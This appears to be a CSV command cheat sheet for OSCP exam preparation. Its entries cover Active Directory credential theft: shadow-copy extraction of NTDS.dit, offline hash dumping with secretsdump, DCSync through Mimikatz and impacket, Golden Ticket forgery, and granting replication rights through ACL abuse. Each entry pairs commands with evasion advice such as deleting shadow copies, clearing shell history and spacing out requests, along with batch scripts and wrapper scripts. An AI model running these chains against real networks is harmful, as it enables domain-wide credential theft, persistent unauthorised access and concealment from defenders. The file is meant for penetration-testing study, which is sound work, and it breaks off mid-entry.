"ad-wmic-create-shadow","Create Shadow Copy with wmic (Legacy)","exploitation","wmic shadowcopy call create Volume=<DRIVE_LETTER>:\","Create Volume Shadow Copy using WMIC (Windows Management Instrumentation Command-line). Legacy method, deprecated in Windows 10/11 but works on older systems.","active-directory","LEGACY METHOD - wmic deprecated, not available on modern Windows (10 21H1+, Server 2022+). ONLY USE: Older lab machines (Server 2012/2016), Windows 7/8/10 pre-21H1. EXAM RELEVANCE: LOW - OSCP labs may have newer systems without wmic. PREFER: vssadmin (native, supported) or PowerShell alternatives. TIME: 5-10 seconds. OPSEC: WMIC usage heavily logged (Process Creation Event 4688, WMI Activity 5857-5861). MODERN ALTERNATIVE: PowerShell: Invoke-WmiMethod -Class Win32_ShadowCopy -Name Create -ArgumentList 'C:\','ClientAccessible' OR Get-CimClass Win32_ShadowCopy | Invoke-CimMethod -MethodName Create -Arguments @{Volume='C:\'} (CIM cmdlets preferred over WMI). After creation, list shadow copies to get device path: wmic shadowcopy list brief OR vssadmin list shadows","low"
"ad-copy-ntds-from-shadow","Extract NTDS.dit from Shadow Copy","exploitation","copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<SHADOW_NUMBER>\Windows\NTDS\ntds.dit <OUTPUT_PATH>","Copy Active Directory database (NTDS.dit) from shadow copy to accessible location for offline credential extraction.","active-directory","CRITICAL STEP for offline NTDS.dit credential extraction. TIME: 5-30 seconds (depends on file size, typically 20-500 MB). EXAM TIP: Note shadow copy number from vssadmin list shadows output - easiest to copy-paste device name rather than type manually. OPSEC: File copy generates minimal events, but extracted NTDS.dit is obvious IOC if found. Delete after parsing: del <OUTPUT_PATH>. FILE SIZE VALIDATION: NTDS.dit typically 20+ MB minimum (even small domains). If <1 MB, copy failed or wrong file. ALTERNATIVE PATHS: (1) Custom installation: Check HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters\""Database log files path"". (2) IFM backup: C:\Windows\IFM\ntds.dit (if Install From Media used). TRANSFER TO KALI: SMB share, certutil base64 encoding, impacket-smbserver, or simple Python HTTP server: python3 -m http.server 8080 (then wget from Kali).","high"
"ad-reg-save-system-hive","Save SYSTEM Registry Hive","exploitation","reg save HKLM\SYSTEM <OUTPUT_PATH>","Export SYSTEM registry hive required to decrypt NTDS.dit offline. Contains boot key (syskey) used to encrypt password hashes in NTDS database.","active-directory","REQUIRED for NTDS.dit decryption - cannot extract credentials without SYSTEM hive. TIME: 3-10 seconds. EXAM TIP: Save SYSTEM hive IMMEDIATELY after copying NTDS.dit (easy to forget, blocks credential extraction). FILE SIZE: ~8-15 MB typical. If <1 MB, export failed. OPSEC: Low-risk operation, standard admin task. ALTERNATIVE HIVES for different scenarios: (1) Local account extraction (workstation/server): reg save HKLM\SAM sam.bak && reg save HKLM\SYSTEM system.bak (2) LSA secrets/cached creds: reg save HKLM\SECURITY security.bak && reg save HKLM\SYSTEM system.bak (3) Domain Controller: Only SYSTEM needed for NTDS.dit. TRANSFER TO KALI: Same methods as NTDS.dit (SMB, HTTP, certutil). MANUAL ALTERNATIVE (PowerShell): reg export HKLM\SYSTEM system.reg (creates text .reg file, NOT suitable for secretsdump - must use 'reg save' binary format). CLEANUP: Delete after transfer: del C:\Temp\system.bak C:\Temp\ntds.dit.bak","high"
"ad-secretsdump-parse-ntds","Parse NTDS.dit Offline with secretsdump","exploitation","impacket-secretsdump -ntds <NTDS_FILE> -system <SYSTEM_FILE> LOCAL","Extract all Active Directory user credentials (NTLM hashes, Kerberos keys) from offline NTDS.dit database using Impacket on Kali Linux.","active-directory","FINAL STEP - extracts ALL domain credentials offline. TIME: 10-60 seconds (depends on domain size, number of users). EXAM TIP: Pipe output to file for easy reference: impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL | tee credentials.txt. OUTPUT PARSING: (1) NTLM hashes: Fourth field (domain\user:RID:LM:NTLM:::) - use for Pass-the-Hash. (2) krbtgt hash: CRITICAL for Golden Ticket (RID 502). (3) Kerberos keys: Below main output, AES256 preferred for Kerberos attacks. (4) Machine accounts: End with $ (DC1$, WEB04$) - usually not crackable. CREDENTIAL USAGE: (1) Crack hashes: hashcat -m 1000 hashes.txt rockyou.txt (NTLM mode 1000). (2) Pass-the-Hash: impacket-psexec -hashes :NThash administrator@target. (3) Golden Ticket: Use krbtgt hash. (4) AS-REP Roasting: Already have hashes, but Kerberos keys useful for forging tickets. FILE CLEANUP: shred -vfz ntds.dit.bak system.bak (secure delete on Kali). ALTERNATIVE TOOLS: (1) DSInternals (PowerShell): Get-ADDBAccount -All -DatabasePath ntds.dit -BootKey <bootkey>. (2) ntdsutil: Native Windows, extract to IFM format. (3) gosecretsdump: Golang version (faster for huge domains). HASH FORMAT: LM hash deprecated (aad3b...ee = empty), focus on NTLM (32 hex chars). Empty NTLM (31d6cfe0...) = blank password.","high"
"ad-vssadmin-delete-shadows","Delete Shadow Copies (Cleanup)","cleanup","vssadmin delete shadows /for=<DRIVE_LETTER>: /all /quiet","Remove all shadow copies from target volume to cleanup forensic artifacts after NTDS.dit extraction.","active-directory","CRITICAL OPSEC STEP - remove evidence of shadow copy abuse. TIME: 5-15 seconds. EXAM CONSIDERATION: Delete shadows AFTER credentials extracted and files transferred to Kali. Don't delete prematurely (may need to re-extract if transfer fails). DISK SPACE: Shadow copies consume 10-30% of volume size - deletion frees significant space. FORENSIC EVIDENCE: Shadow copy creation logs Event ID 8222 (VSS), usage logs 4663 (file access), deletion logs 8224. Deletion removes snapshots but NOT event logs (requires log clearing). ALTERNATIVES: (1) Delete oldest only: vssadmin delete shadows /for=C: /oldest /quiet (preserve recent shadows for legitimate backup). (2) Delete specific shadow: vssadmin delete shadows /shadow={GUID} (from vssadmin list shadows output). (3) PowerShell: Get-WmiObject Win32_ShadowCopy | Where-Object {$_.VolumeName -eq 'C:\\'} | ForEach-Object {$_.Delete()}. RANSOMWARE TECHNIQUE: Attackers often delete shadows to prevent recovery (vssadmin delete shadows /all /quiet). Blue team IOC: Unexpected shadow deletion, especially with /quiet flag. EXAM STRATEGY: Trade-off between stealth (delete shadows) vs backup (keep shadows for re-extraction if needed). Recommend: Keep shadows until final credential validation, then delete before moving to next target.","high"
"ad-dcsync-mimikatz-single-user","DCSync Single User with Mimikatz","post-exploit","mimikatz # lsadump::dcsync /domain:<DOMAIN_FQDN> /user:<TARGET_USER>","Extract password hashes and Kerberos keys for a specific domain user by impersonating a domain controller and requesting credential replication. Faster and stealthier than full domain dumps.","credential-dumping","OSCP METHODOLOGY - WHEN TO USE DCSYNC:
DCSync is a POST-EXPLOITATION technique used AFTER obtaining Domain Admin or equivalent rights.

Typical OSCP exam workflow:
1.

INITIAL ACCESS:
Compromise domain-joined machine (password spray, AS-REP roast, web exploit)
2.

LOCAL PRIVILEGE ESCALATION:
Become local admin (AlwaysInstallElevated, SeImpersonate, kernel exploit)
3.

LATERAL MOVEMENT:
Move to higher-value targets (pass-the-hash, overpass-the-hash, Kerberos delegation)
4.

DOMAIN ADMIN COMPROMISE:
Obtain DA credentials (LSASS dump, credential harvesting, Kerberoasting admin account)
5.

**DCSYNC**:
Dump all domain credentials for persistence and complete control
6.

GOLDEN TICKET:
Use krbtgt hash for persistent domain-wide access

WHY DCSYNC INSTEAD OF NTDS.DIT EXTRACTION:
TRADITIONAL METHOD (NTDS.dit dump):
- Requires LOCAL ADMIN on domain controller (higher bar)
- Requires DIRECT ACCESS to DC (RDP, PSExec, WinRM)
- Generates DISK I/O (create VSS snapshot, copy NTDS.dit file)
- Slower (NTDS.dit is 100MB-10GB+, takes minutes to transfer)
- More forensic artifacts (file creation, VSS snapshot, disk access logs)

DCSYNC METHOD:
- Requires Domain Admin OR replication rights (same privilege level, different approach)
- Works REMOTELY (no need to log into DC)
- NO disk access (pure network operation over RPC)
- Faster for single users (1-5 seconds per user)
- Less forensic artifacts (appears as normal replication traffic)
- Stealthier (Event ID 4662 on DC, but replication traffic is common)

WHEN TO USE EACH:
- Use DCSync:
When you have DA rights from remote machine, want specific user hashes quickly, need stealth
- Use NTDS.dit:
When you have local admin on DC but NOT domain admin, want complete offline analysis, DCSync is detected/blocked

MANUAL ALTERNATIVES (if Mimikatz unavailable):
Impacket secretsdump (Linux):
impacket-secretsdump -just-dc-user <username> corp.com/administrator:password@DC1.corp.com
- Achieves same result as Mimikatz DCSync
- Works from Linux (Kali in OSCP exam)
- Output format:
domain\user:RID:LMhash:NThash:::
- See ad-dcsync-impacket-secretsdump-user command for details

SharpKatz (C# alternative to Mimikatz):
SharpKatz.exe --Command dcsync --User <username> --Domain corp.com --DomainController DC1.corp.com
- Modern C# implementation
- Better OPSEC (fewer signatures than Mimikatz)
- Requires .NET 4.5+

DCSYNC OUTPUT EXPLANATION:
EXAMPLE OUTPUT:
mimikatz # lsadump::dcsync /domain:corp.com /user:Administrator
[DC] 'corp.com' will be the domain
[DC] 'DC1.corp.com' will be the DC server
[DC] 'corp\Administrator' will be the user account

Object RDN:
Administrator

** SAM ACCOUNT **
SAM Username:
Administrator
Account Type:
30000000 ( USER_OBJECT )
User Account Control:
00000200 ( NORMAL_ACCOUNT )
Account expiration:
Password last change:
9/7/2022 9:54:57 AM ← Last password change
Object Security ID:
S-1-5-21-1987370270-658905905-1781884369-500
Object Relative ID:
500 ← RID 500 = Domain Administrator

Credentials:
  Hash NTLM:
2892d26cdf84d7a70e2eb3b9f05c425e ← PRIMARY TARGET (use for PTH, Golden tickets)
  ntlm- 0:
2892d26cdf84d7a70e2eb3b9f05c425e ← Current NTLM hash
  ntlm- 1:
a11e808659d5ec5b6c4f43c1e5a0972d ← Password history (previous hash)
  lm  - 0:
45bc7d437911303a42e764eaf8fda43e ← LM hash (legacy, ignore unless old systems)

Kerberos keys (for AES-based attacks):
  aes256-cts-hmac-sha1-96:
<64_hex_chars> ← AES256 key (use for stealthier Kerberos attacks)
  aes128-cts-hmac-sha1-96:
<32_hex_chars> ← AES128 key
  des-cbc-md5:
<16_hex_chars> ← DES key (legacy, weak)

WHAT TO EXTRACT:
1.

**NTLM hash (primary)**:
Use for Pass-the-Hash, crack for plaintext password, use in Silver/Golden tickets
2.

**Kerberos AES256 key**:
Use for stealthier Kerberos attacks (AES preferred over RC4 in modern environments)
3.

**Password history**:
If current password is complex, try cracking historical passwords (users often increment:
Password1 → Password2)
4.

**RID**:
Identifies account type (500=Administrator, 502=krbtgt, 1000+=custom users)
5.

**Password last change**:
Recent change may indicate active use (target for additional exploitation)

TIME ESTIMATES FOR OSCP EXAM:
- Single user DCSync:
1-5 seconds (network latency dependent)
- Crack NTLM hash (if needed):
5-30 minutes (depends on password complexity, wordlist size)
- Create Golden Ticket from krbtgt hash:
<1 minute
- TOTAL (from DA to Golden Ticket):
5-10 minutes

If DCSync fails (permissions or network issues):
Fall back to NTDS.dit extraction (10-30 minutes including transfer and parsing)

DETECTION AND OPSEC:
EVENT IDS GENERATED:
- **Event ID 4662** on Domain Controller:
""An operation was performed on an object"" with:
  - Properties:
{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (Replicating Directory Changes)
  - Properties:
{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} (Replicating Directory Changes All)
- **Event ID 4624**:
Logon Type 3 (Network logon) from DCSync source machine
- **Event ID 5156**:
Windows Filtering Platform (RPC connection to DC)

DETECTION INDICATORS (Blue Team Perspective):
- Replication request from NON-DC machine (legitimate replication is DC-to-DC only)
- User account (not computer account) performing replication (DCs use MACHINE$ accounts)
- Replication outside normal schedule (production environments have scheduled replication windows)
- Single object replication (unusual - DCs replicate entire partitions, not individual users)
- Source IP is workstation/server, not DC IP range

OPSEC IMPROVEMENTS:
1.

**Target specific users only**:
Avoid /all dumps (loud, slow, generates massive logs)
2.

**Use compromised DC computer account**:
If you've compromised a DC, use its machine account for DCSync (appears legitimate)
3.

**Timing**:
Perform during business hours when replication traffic is normal (not 3am)
4.

**Space out requests**:
Don't dump 100 users in 30 seconds (automated tool pattern)
5.

**Use legitimate admin account**:
If you've compromised real DA account, use it (not 'hacker' or 'pwned' accounts)

COMMON OSCP EXAM SCENARIO:
You've compromised a domain user 'jeff' on CLIENT75.

After local privilege escalation and lateral movement, you discover 'jeffadmin' (Domain Admin) has an active session on CLIENT75.

You dump LSASS and obtain jeffadmin's NTLM hash.

NEXT STEPS:
1.

Pass-the-hash as jeffadmin:
impacket-wmiexec -hashes :ntlm_hash corp.com/jeffadmin@DC1.corp.com
2.

DCSync krbtgt:
mimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt
3.

Record krbtgt NTLM hash:
4d28cf5252d39971419580a51484ca09
4.

Extract Domain SID:
whoami /user → S-1-5-21-1987370270-658905905-1781884369
5.

Create Golden Ticket:
mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:4d28cf5252d39971419580a51484ca09 /user:fakeadmin /ptt
6.

Access ANY resource:
dir \\DC1\C$, Enter-PSSession -ComputerName DC1, etc.

DCSYNC VS KERBEROASTING (attack chain):
KERBEROASTING (pre-compromise):
- Target:
Service accounts with SPNs
- Privilege:
Any domain user (low-privilege)
- Result:
TGS-REP encrypted with service account password
- Next step:
Crack offline to get service account password

DCSYNC (post-compromise):
- Target:
ANY domain account (users, admins, service accounts, computer accounts)
- Privilege:
Domain Admin or replication rights (high-privilege)
- Result:
NTLM hash, Kerberos keys (no cracking needed)
- Next step:
Use hash directly (PTH, Golden/Silver tickets)

THEY'RE COMPLEMENTARY:
- Kerberoasting gets you INTO domain admin (crack service account with admin rights)
- DCSync gets you PERSISTENCE after domain admin (dump krbtgt for Golden tickets)

KEY DIFFERENCES FROM GOLDEN TICKET:
DCSYNC:
- Dumps credentials (NTLM hashes, Kerberos keys)
- Requires execution (run Mimikatz/secretsdump)
- Active operation (network traffic, logs generated)
- Used to OBTAIN krbtgt hash

GOLDEN TICKET:
- Forges Kerberos TGT (Ticket Granting Ticket)
- Uses krbtgt hash obtained via DCSync
- Grants persistent domain-wide access
- Used AFTER DCSync to create persistence

WORKFLOW:
DCSync krbtgt → Extract NTLM hash → Create Golden Ticket → Persistent access

FINAL OSCP EXAM TIPS:
1.

**Always DCSync krbtgt first**:
Even if you only need one user's hash, grab krbtgt for Golden Ticket persistence
2.

**Document all hashes**:
Create a 'hashes.txt' file with format:
username:NTLM_hash
3.

**Crack hashes offline**:
Don't crack on exam machines (slow, resource-intensive).

Copy hashes to Kali, use Hashcat
4.

**Test hashes immediately**:
Verify hashes work with crackmapexec before building Golden/Silver tickets
5.

**Backup method**:
If DCSync fails, immediately pivot to NTDS.dit extraction (don't waste time troubleshooting)
6.

**Multiple DCs**:
If domain has multiple DCs, try different ones if primary DC fails (DC2, DC3, etc.)
7.

**Time management**:
DCSync should take <10 minutes total.

If longer, move on to other targets

PRACTICE EXERCISES:
1.

Memorize syntax:
lsadump::dcsync /domain:<domain> /user:<user>
2.

Practice identifying replication rights:
Get-DomainObjectAcl with ResolveGUIDs
3.

Practice both Mimikatz and impacket methods (Windows and Linux)
4.

Simulate:
Compromise DA → DCSync krbtgt → Golden Ticket → Access DC → Dump NTDS.dit (full chain)
5.

Troubleshoot:
Intentionally use non-DA account, observe errors, practice permission verification","high"
"ad-dcsync-impacket-secretsdump-user","DCSync Single User with impacket-secretsdump","post-exploit","impacket-secretsdump -just-dc-user <TARGET_USER> '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>'","Linux-based DCSync attack using impacket-secretsdump to extract a specific user's credentials via DRSUAPI replication. Ideal for OSCP Kali-based attacks.","credential-dumping","OSCP METHODOLOGY - LINUX-BASED DCSYNC:
impacket-secretsdump is the PREFERRED DCSync method from Kali Linux during OSCP exams.

It achieves identical results to Mimikatz lsadump::dcsync but from a non-Windows attack platform.

WHY USE IMPACKET INSTEAD OF MIMIKATZ:
✅ ADVANTAGES:
1.

**Cross-platform**:
Works from Kali Linux (your primary attack platform in OSCP)
2.

**No AV/EDR**:
Doesn't execute on target (runs from Kali, only network traffic to DC)
3.

**Pre-installed**:
Included in Kali by default (apt install impacket-scripts if missing)
4.

**Scriptable**:
Easy to automate (bash scripts, loop through multiple users)
5.

**Clean output**:
Machine-parseable format (easier to extract hashes programmatically)

❌ DISADVANTAGES:
1.

**Requires network access**:
Must route to DC from Kali (VPN, pivoting, or direct network)
2.

**Less features**:
Mimikatz has more Kerberos manipulation options (PTT, ticket exports)
3.

**Password complexity**:
Bash special characters can be tricky (but solvable with quoting)

🎯 OSCP EXAM DECISION:
- Use impacket-secretsdump:
When attacking from Kali (most common), have network access to DC
- Use Mimikatz:
When already on Windows machine with DA session, need advanced Kerberos features

TYPICAL OSCP EXAM WORKFLOW:
1.

**INITIAL COMPROMISE** (from Kali):
   - Password spray with crackmapexec
   - AS-REP roast with impacket-GetNPUsers
   - Kerberoast with impacket-GetUserSPNs
   Result:
Valid domain credentials (user:password or user:hash)

2.

**LATERAL MOVEMENT** (from Kali):
   - Pass-the-hash to higher-value targets with impacket-wmiexec
   - Dump LSASS on remote machines with impacket-secretsdump -sam/-security/-system
   Result:
Domain Admin NTLM hash or password

3.

**DCSYNC** (from Kali - THIS COMMAND):
   impacket-secretsdump -just-dc-user krbtgt 'corp.com/administrator:password@192.168.50.70'
   Result:
krbtgt NTLM hash (for Golden Tickets), Administrator hash (for persistence)

4.

**PERSISTENCE** (from Kali):
   - Golden Ticket:
impacket-ticketer -nthash <krbtgt_hash> -domain corp.com -domain-sid S-1-5-21-XXX fakeadmin
   - Pass-the-hash:
impacket-wmiexec -hashes :NTLM_HASH corp.com/Administrator@<target>
   Result:
Persistent domain-wide access

ALL FROM KALI - NO WINDOWS ACCESS NEEDED.

COMMAND VARIATIONS:
# Basic DCSync (single user with password auth):
impacket-secretsdump -just-dc-user Administrator 'corp.com/admin:Pass123!@192.168.50.70'

# DCSync with Pass-the-Hash:
impacket-secretsdump -just-dc-user Administrator -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/admin@192.168.50.70

# DCSync krbtgt for Golden Ticket:
impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:Pass123!@192.168.50.70'

# DCSync all users (full domain dump):
impacket-secretsdump -just-dc-ntlm 'corp.com/admin:Pass123!@192.168.50.70'

# DCSync with Kerberos authentication (if you have TGT):
export KRB5CCNAME=/tmp/admin.ccache
impacket-secretsdump -k -no-pass -just-dc-user Administrator corp.com/admin@DC1.corp.com

# DCSync and save to file:
impacket-secretsdump -just-dc-user Administrator 'corp.com/admin:Pass123!@192.168.50.70' > dcsync_output.txt

# DCSync specific computer account (for Silver tickets):
impacket-secretsdump -just-dc-user 'WEB04$' 'corp.com/admin:Pass123!@192.168.50.70'

OUTPUT PARSING AUTOMATION:
# Extract NTLM hash only:
impacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep ':500:' | cut -d ':' -f 4

# Extract Kerberos AES256 key:
impacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep 'aes256' | awk '{print $NF}'

# Batch DCSync multiple users:
for user in Administrator krbtgt jeff dave; do
  echo ""[+] DCSync $user""
  impacket-secretsdump -just-dc-user $user 'corp.com/admin:pass@192.168.50.70' | grep ""$user""
done

# Save all hashes to file:
impacket-secretsdump -just-dc-ntlm 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep ':::' > all_hashes.txt

INTEGRATION WITH OTHER IMPACKET TOOLS:
# Chain:
DCSync → Extract hash → Pass-the-hash → Remote code execution
impacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@192.168.50.70' | grep ':500:' | cut -d ':' -f 4 > admin_hash.txt
ADMIN_HASH=$(cat admin_hash.txt)
impacket-wmiexec -hashes :$ADMIN_HASH corp.com/Administrator@192.168.50.70

# Chain:
DCSync krbtgt → Golden Ticket → Access any machine
impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70' | grep 'krbtgt' | cut -d ':' -f 4 > krbtgt_hash.txt
KRBTGT_HASH=$(cat krbtgt_hash.txt)
impacket-ticketer -nthash $KRBTGT_HASH -domain corp.com -domain-sid S-1-5-21-XXX -user-id 500 fakeadmin
export KRB5CCNAME=fakeadmin.ccache
impacket-wmiexec -k -no-pass corp.com/fakeadmin@DC1.corp.com

COMPARISON:
IMPACKET VS MIMIKATZ DCSYNC:
| Feature | impacket-secretsdump | Mimikatz lsadump::dcsync |
|---------|---------------------|---------------------------|
| Platform | Linux (Kali) | Windows |
| Installation | Pre-installed Kali | Manual download/transfer |
| AV/EDR risk | None (runs remotely) | High (executes on target) |
| Output format | domain\user:RID:LM:NTLM:::
| Verbose with metadata |
| Authentication | Password, hash, Kerberos | Same |
| Batch operations | Easy (bash loops) | Manual (repeat commands) |
| Kerberos manipulation | Limited | Extensive (PTT, ticket forge) |
| OSCP exam fit | **Excellent** | Good (if Windows access) |

TIME ESTIMATES FOR OSCP EXAM:
- Single user DCSync:
2-10 seconds (network latency dependent)
- Full domain DCSync (-just-dc-ntlm):
30-120 seconds (depends on user count:
50 users ~30s, 500 users ~2min)
- Hash extraction and formatting:
<5 seconds (automated with cut/awk)
- TOTAL (DA credentials → krbtgt hash):
**<1 minute**

If secretsdump hangs >30 seconds:
Check network connectivity, try alternative DC, or use Mimikatz from Windows

DETECTION (identical to Mimikatz DCSync):
- Event ID 4662 on DC (same replication events)
- Source IP is Kali Linux (non-Windows, non-DC)
- OPSEC identical to Mimikatz (both use DRSUAPI)
- Blue team cannot distinguish between impacket and Mimikatz DCSync (protocol-level identical)

OPSEC CONSIDERATIONS:
1.

**Use -just-dc-user instead of -just-dc-ntlm**:
Targeted extraction is faster and generates fewer logs
2.

**Pass-the-hash instead of password**:
Avoid cleartext password in command history
   ```bash
   # Clear history after:
   history -c
   # Or use:
   HISTFILE=/dev/null impacket-secretsdump ...
   ```
3.

**Save output to temp file**:
`impacket-secretsdump ...

> /tmp/dcsync.txt` then `shred -u /tmp/dcsync.txt` after use
4.

**Batch DCSync**:
If dumping multiple users, space out requests (don't hammer DC with 100 requests in 10 seconds)

COMMON MISTAKES TO AVOID:
1.

❌ Forgetting quotes around authentication string:
   WRONG:
impacket-secretsdump ...

corp.com/admin:Pass123!@192.168.50.70
   RIGHT:
impacket-secretsdump ...

'corp.com/admin:Pass123!@192.168.50.70'

2.

❌ Using DOMAIN\username format:
   WRONG:
'CORP\admin:pass@192.168.50.70'
   RIGHT:
'corp.com/admin:pass@192.168.50.70' OR 'CORP/admin:pass@192.168.50.70'

3.

❌ Not verifying Domain Admin privileges first:
   TEST:
crackmapexec smb 192.168.50.70 -u admin -p Pass123! --groups
   VERIFY:
Output should show ""Domain Admins"" group

4.

❌ Using wrong flag:
   WRONG:
-just-dc-user (dumps single user via DCSync) ✓
   WRONG:
-just-user (doesn't exist)
   WRONG:
-user (doesn't exist)

5.

❌ Typo in target username:
   ERROR:
'[-] User 'Adminstrator' not found'
   FIX:
Administrator (correct spelling)

TROUBLESHOOTING CHECKLIST:
- [ ] Domain Admin credentials verified (crackmapexec --groups shows 'Domain Admins')
- [ ] DC is reachable (ping, smbclient, ldapsearch)
- [ ] Authentication string properly quoted ('domain/user:pass@dc')
- [ ] Special characters in password escaped or single-quoted
- [ ] Target username spelled correctly (case-insensitive but must be exact)
- [ ] Correct flag used (-just-dc-user for single user)
- [ ] Network routing configured (VPN active, pivoting setup)

NEXT STEPS AFTER DCSYNC:
1.

**Extract NTLM hash**:
grep output, cut field 4
2.

**Test hash validity**:
crackmapexec smb <target> -u <user> -H <hash>
3.

**Crack hash (optional)**:
hashcat -m 1000 hash.txt rockyou.txt
4.

**Use for lateral movement**:
impacket-wmiexec -hashes :<hash> domain/user@target
5.

**Create Golden Ticket (if krbtgt)**:
impacket-ticketer -nthash <krbtgt_hash> ...
6.

**Document all hashes**:
Store in creds.txt for reference

FINAL OSCP EXAM TIP:
Create a DCSync alias in your .bashrc for quick execution:
```bash
alias dcsync='impacket-secretsdump -just-dc-user'
# Usage:
dcsync krbtgt 'corp.com/admin:pass@192.168.50.70'
```

Or create a wrapper script:
```bash
#!/bin/bash
# dcsync.sh - Quick DCSync wrapper
USER=$1
DOMAIN=$2
ADMIN=$3
PASS=$4
DC=$5
impacket-secretsdump -just-dc-user $USER ""$DOMAIN/$ADMIN:$PASS@$DC"" 2>/dev/null | grep ""::""

# Usage:
./dcsync.sh krbtgt corp.com administrator Pass123! 192.168.50.70
```

PRACTICE BEFORE EXAM:
1.

Memorize syntax:
impacket-secretsdump -just-dc-user <user> '<domain>/<admin>:<pass>@<dc>'
2.

Practice special character escaping (!, $, @)
3.

Practice output parsing (cut, awk, grep)
4.

Chain with other impacket tools (wmiexec, psexec, ticketer)
5.

Troubleshoot permission errors (identify when you're NOT domain admin)","high"
"ad-dcsync-check-permissions","Check DCSync Replication Permissions","enumeration","Get-DomainObjectAcl -DistinguishedName 'DC=<DOMAIN>,DC=<TLD>' -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication') -and ($_.SecurityIdentifier -match $(ConvertTo-SID $env:USERNAME))}","Verify if the current user or specified account has the required ACL permissions to perform DCSync attacks (Replicating Directory Changes rights on the domain object).","privilege-enumeration","OSCP METHODOLOGY - DCSYNC PERMISSION VALIDATION:
BEFORE attempting DCSync attacks, VALIDATE permissions to avoid:
1.

**Detection**:
Failed DCSync attempts generate Event ID 4662 (suspicious if repeated)
2.

**Time waste**:
Troubleshooting permission errors during exam wastes precious time
3.

**Account lockout**:
Repeated failures may trigger security alerts or account restrictions

WHEN TO CHECK DCSYNC PERMISSIONS:
1.

**After obtaining Domain Admin**:
   - Verify DA account actually works
   - Confirm no unusual ACL restrictions
   - Validate before proceeding with Golden Ticket workflow

2.

**When enumerating privilege escalation paths**:
   - Identify which accounts can DCSync (besides default DAs)
   - Discover custom delegated permissions (backup operators, etc.)
   - Map attack graph:
User A → DCSync → krbtgt hash → Golden Ticket

3.

**After compromising service account**:
   - Some service accounts have replication rights (backup services, monitoring tools)
   - Verify before attempting DCSync with service account credentials

4.

**During ACL abuse attacks**:
   - If you have WriteDACL on domain object, you can GRANT yourself replication rights
   - Validate after granting rights to confirm success

DEFAULT GROUPS WITH REPLICATION RIGHTS:
BY DEFAULT, these groups have DS-Replication-Get-Changes + DS-Replication-Get-Changes-All:
1.

**Domain Admins** (most common):
   - Default administrative group for domain
   - RID:
512 (S-1-5-21-DOMAIN-DOMAIN-DOMAIN-512)
   - Check membership:
net group ""Domain Admins"" /domain

2.

**Enterprise Admins** (forest-wide):
   - Exists only in forest root domain
   - Has admin rights across ALL domains in forest
   - Check membership:
net group ""Enterprise Admins"" /domain

3.

**Administrators** (built-in):
   - Built-in local administrators group
   - Check membership:
net localgroup Administrators

4.

**Domain Controllers** (computer accounts):
   - All DC machine accounts (DC1$, DC2$, etc.)
   - Used for legitimate DC-to-DC replication

CUSTOM DELEGATED PERMISSIONS (less common but possible):
- **Backup Operators**:
Sometimes granted replication rights for backup software
- **Monitoring accounts**:
SIEM/monitoring tools may need replication access for auditing
- **Specific service accounts**:
Custom delegation for specific business needs

DISCOVER CUSTOM DELEGATIONS:
Get-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication'} | Select SecurityIdentifier,ObjectAceType | Sort-Object -Unique
# Shows ALL SIDs with replication rights
# Convert SIDs to names:
ConvertFrom-SID <SID>

MANUAL ALTERNATIVE (without PowerView):
USING DSACLS.EXE (Windows built-in):
dsacls.exe ""DC=corp,DC=com"" | findstr /i replication

OUTPUT EXAMPLE:
  Allow CORP\Domain Admins     DS-Replication-Get-Changes
  Allow CORP\Domain Admins     DS-Replication-Get-Changes-All
  Allow CORP\Enterprise Admins DS-Replication-Get-Changes
  Allow CORP\Enterprise Admins DS-Replication-Get-Changes-All

INTERPRETATION:
- 'Allow' = Permission granted (not 'Deny')
- Principal (CORP\Domain Admins) = Who has permission
- Permission name = What they can do

LOOK FOR YOUR USER/GROUPS:
dsacls.exe ""DC=corp,DC=com"" | findstr /i ""jeffadmin\|replication""
# Shows if user 'jeffadmin' has replication rights

USING NATIVE POWERSHELL (no PowerView):
(Get-Acl -Path 'AD:\DC=corp,DC=com').Access | ? {$_.ObjectType -like '*1131f6a*'} | Select IdentityReference,ActiveDirectoryRights
# ObjectType GUID 1131f6a* matches replication permissions
# Output shows IdentityReference (user/group) and their rights

ACL ABUSE - GRANTING DCSYNC PERMISSIONS:
IF YOU HAVE WriteDACL PERMISSION on domain object, you can GRANT replication rights to any user:
# Add DCSync permissions to user 'backupuser' (PowerView):
Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=com' -PrincipalIdentity 'backupuser' -Rights DCSync

# ALTERNATIVELY (native PowerShell, more complex):
$user = Get-ADUser backupuser
$acl = Get-Acl -Path 'AD:\DC=corp,DC=com'
$sid = New-Object System.Security.Principal.SecurityIdentifier $user.SID
# Add DS-Replication-Get-Changes
$ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid,'ExtendedRight','Allow',([guid]'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2')
# Add DS-Replication-Get-Changes-All
$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid,'ExtendedRight','Allow',([guid]'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')
$acl.AddAccessRule($ace1)
$acl.AddAccessRule($ace2)
Set-Acl -Path 'AD:\DC=corp,DC=com' -AclObject $acl

VALIDATE AFTER GRANTING:
Get-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication') -and ($_.SecurityIdentifier -match $(ConvertTo-SID 'backupuser'))}
# Should show BOTH permissions now

TIME ESTIMATES FOR OSCP EXAM:
